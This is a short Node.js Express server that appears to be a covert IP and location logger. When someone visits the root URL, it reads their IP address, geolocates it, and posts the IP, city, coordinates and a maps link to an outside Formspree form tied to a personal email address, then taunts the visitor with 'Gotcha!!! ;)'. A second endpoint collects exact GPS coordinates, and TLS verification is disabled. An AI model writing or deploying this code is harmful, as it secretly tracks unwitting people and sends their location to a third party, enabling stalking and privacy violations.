const express = require('express');
const cors = require('cors');
const geoip = require('geoip-lite');
const axios = require('axios');
const https = require('https');
const app = express();
const PORT = process.env.PORT || 3000;
const HOST = process.env.HOST || 'localhost'

// Create axios instance with SSL certificate handling
const axiosInstance = axios.create({
    httpsAgent: new https.Agent({
        rejectUnauthorized: false
    })
});

app.use(cors());
app.use(express.json());

// Endpoint to receive location data
app.post('/location', (req, res) => {
    const { latitude, longitude } = req.body;
    // Log the received location data
    console.log(`Location received https://www.google.com/maps?q=${latitude},${longitude}`);
    
    // Respond with a confirmation message
    res.status(200).json({ message: `Location received https://www.google.com/maps?q=${latitude},${longitude}` });
});

// Endpoint to get user IP and location
app.get('/', async (req, res) => {
    try {
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const geo = geoip.lookup(ip?.trim()?.split(",")[0]);
        console.log({ip, geo})
        
        const message = `
            IP Address: ${ip}
            Location: ${geo ? `${geo.city}, ${geo.country}` : 'Unknown'}
            Coordinates: ${geo ? `${geo.ll[0]}, ${geo.ll[1]}` : 'Unknown'}
            Maps Link: ${geo ? `https://www.google.com/maps?q=${geo.ll[0]},${geo.ll[1]}` : 'N/A'}
            Time: ${new Date().toISOString()}
        `;

        const result = await axiosInstance.post('https://formspree.io/f/mwplkvql', {
            email: 'darwinfegarido@gmail.com',
            message: message
        }, {
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
            }
        });

        res.status(200).json({ message: 'Gotcha!!! ;)' });
    } catch (error) {
        console.error('Error:', error.message);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Start the server
app.listen(PORT, HOST, () => {
    console.log(`Server running at http://${HOST}:${PORT}`);
});
